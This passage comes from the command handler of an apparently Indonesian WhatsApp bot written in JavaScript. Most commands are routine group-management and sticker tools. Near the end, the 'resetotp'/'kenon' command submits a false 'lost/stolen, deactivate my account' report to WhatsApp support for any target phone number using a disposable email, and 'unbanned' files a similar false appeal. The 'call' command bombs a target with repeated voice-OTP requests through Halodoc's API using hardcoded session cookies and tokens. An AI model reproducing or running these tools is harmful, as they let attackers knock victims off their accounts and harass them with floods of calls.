       }
break
case 'attp': 
case 'attp2': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
reply(global.wait)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
conn.sendFile2(m.chat, ini_buffer, 'sticker.webp', '', m)
       }
break
case 'tts': case 'gtts':{
if (!text) return paycall('Masukin Teksnya')
            let texttts = text
            const shintts = googleTTS.getAudioUrl(texttts, {
                lang: "id",
                slow: false,
                host: "https://translate.google.com",
            })
            return conn.sendMessage(m.chat, {
                audio: {
                    url: shintts,
                },
                mimetype: 'audio/mp4',
                ptt: false,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
//END STICKER
case 'tes':
case 'ping':
         case 'runtime': {
         const used = process.memoryUsage()
            const cpus = os.cpus().map(cpu => {
               cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
               return cpu
            })
            const cpu = cpus.reduce((last, cpu, _, {
               length
            }) => {
               last.total += cpu.total
               last.speed += cpu.speed / length
               last.times.user += cpu.times.user
               last.times.nice += cpu.times.nice
               last.times.sys += cpu.times.sys
               last.times.idle += cpu.times.idle
               last.times.irq += cpu.times.irq
               return last
            }, {
               speed: 0,
               total: 0,
               times: {
                  user: 0,
                  nice: 0,
                  sys: 0,
                  idle: 0,
                  irq: 0
               }
            })
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            let respon = `⏳Runtime : ${runtime(process.uptime())}\n📌Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
            paytod(respon)
            }
            break
            
//GROUP MENU
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let response = await conn.groupInviteCode(from)
conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
conn.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await conn.groupInviteCode(from)
conn.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break

case 'out': case 'leave': case 'leavegc': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await conn.groupLeave(m.chat)
await m.reply(`Done`)
}
break
            
case 'kick': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.quoted.sender
			        }
			    })
await conn.groupParticipantsUpdate(from, [users], 'remove')
await conn.sendMessage(m.chat, {text: `\`\`\`「 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝘾𝙆 」\`\`\``}, {quoted: m})
}
break

case 'add': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'hidetag': case 'hid':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)
})
break
case 'totag': case 'tg':
                if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
                conn.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break

case 'setgc': case 'editgrup': case 'editgroup': {   
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break

case 'setppgc': {
if (!m.isGroup) return m.reply(`*khusus Grup bodo*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
m.reply(global.wait)
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(m.chat, { url: media }) }
m.reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break

case 'editinfo': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
 if (args[0] === 'open'){
await conn.groupSettingUpdate(from, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await conn.groupSettingUpdate(from, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 conn.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editsubjek': {
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!text) throw 'Text nya ?'
await loading()
await conn.groupUpdateSubject(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'editdesk':{
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!text) throw 'Text Nya ?'
await loading()
await conn.groupUpdateDescription(from, text).then((res)).catch((err) => m.reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: blue })
}
break

case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'demote')
break

case 'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.groupParticipantsUpdate(from, mems, 'promote')
break

case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
conn.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'antilink': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args[0] === "on") {
if (AntiLinkInstagram) return paycall('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning on instagram antilink in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return paycall('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
paycall('Success in turning off instagram antilink in this group')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antilinkch': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args[0] === "on") {
if (AntiLinkChannel) return paycall('Already activated')
ntilinkchannel.push(from)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mengaktifkan antilink Channel WhatsApp di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link Saluran WhatsApp di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkChannel) return paycall('Already deactivated')
let off = ntilinkchannel.indexOf(from)
ntilinkchannel.splice(off, 1)
fs.writeFileSync('./database/antilinkchannelwa.json', JSON.stringify(ntilinkchannel))
paycall('Sukses mematikan antilink Channel WhatsApp di grup ini')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'antieval': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args[0] === "on") {
if (AntiEval) return paycall('Already activated')
nteval.push(from)
fs.writeFileSync('./database/antieval.json', JSON.stringify(nteval))
paycall('Sukses mengaktifkan anti Eval WhatsApp di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan Eval sembarangan di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiEval) return paycall('Already deactivated')
let off = nteval.indexOf(from)
nteval.splice(off, 1)
fs.writeFileSync('./database/antieval.json', JSON.stringify(nteval))
paycall('Sukses mematikan anti Eval WhatsApp di grup ini')
} else {
  await paycall(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'autostickergc':
            case 'autostiker':
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args.length < 1) return paycall('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[0]  === 'on'){
if (isAutoSticker) return paycall(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
paycall('autosticker activated')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
paycall('auto sticker deactivated')
}
break
  case 'antivirus': case 'antivirtex': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return m.reply(`*khusus Owner dan admin*`)
if (args[0] === "on") {
if (antiVirtex) return paycall('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
paycall('Sukses mengaktifkan antivirus di grup ini')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak boleh ada siapapun yang mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return paycall('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
paycall('Sukses mematikan antivirus grup ini')
} else {
  await paycall(`Silakan Ketik Opsinya\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

case 'tourl': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}

break
case 'toonce':
            case 'nyehh': {
            if (!isCreator) return paycall(global.ownercuy)
                if (!quoted) return paycall(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/audio/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        audio: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "19",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                    } else if (/document/.test(mime)) {
                    anuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: anuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
                    conn.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `${done}`,
                        fileLength: "9999999999999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break

case 'block': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'unblock': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//END GROUP MENU

//========================REPEAT WHATSAPP=========================//
case 'repeat':
if (!isCreator) return paycall(global.ownercuy)
if (!text) return paycall('Masukan Text|jumlah')
reply(global.wait)
var shinchan_kawaii = `${args.join(' ')}`
var kata = shinchan_kawaii.split("|")[0];
var angka = shinchan_kawaii.split("|")[1]
let katanya = `${kata}`.repeat(angka)
await conn.sendMessage(m.chat, { text: `${katanya}` }, { quoted: blue})
break
case 'getcase':
if (!isCreator) return paycall(global.ownercuy)
const getCase = (cases) => {
return "case" + `'${cases}'` + fs.readFileSync("main.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
}
reply(`${getCase(q)}`)
break
case 'q': case 'quoted': {
if (!m.quoted) return paycall('Reply the Message!!')
let shinuwu= await conn.serializeM(await m.getQuotedObj())
if (!shinuwu.quoted) return paycall('Pesan yang Anda balas tidak dikirim oleh bot')
await shinuwu.quoted.copyNForward(m.chat, true)
}
break
//END REPEAT
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo admin WhatsApp, saya mohon buka kembali akun WhatsApp saya +${targetnya} karena saya tidak melakukan spam, saat ini mungkin akun WhatsApp saya sedang di retas oleh orang yang tidak bertanggung jawab dan melakukan pelanggaran. Saya mohon untuk membuka kembali Akun WhatsApp saya agar bisa digunakan kembali karena sangat penting. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp🥰💖`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//
case 'resetotp': case 'kenon': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses✓, silahkan tunggu 1-24 jam balasan dari pihak WhatsApp`)
} else if (payload.includes(`"payload":false`)) {
reply(`Yah Email sudah kena limit, jadi nunggu 1 minggu buat di akses lagi`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================//
case "call":
if (!isCreator) return m.reply('*khusus Owner*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6282788388737`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+0`)) return paycall('Tidak bisa call ke nomor ini!')
for (let x = 0; x < 10; x++) {
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {paycall(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {paycall(`${JSON.stringify(error, null, 2)}`)})
}
break
case "call2":
if (!isCreator) return reply('Khusus Owner')
let shinchan = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
let shinko = text.split("|")[1]
for (let i = 1; i < shinko ; i++){
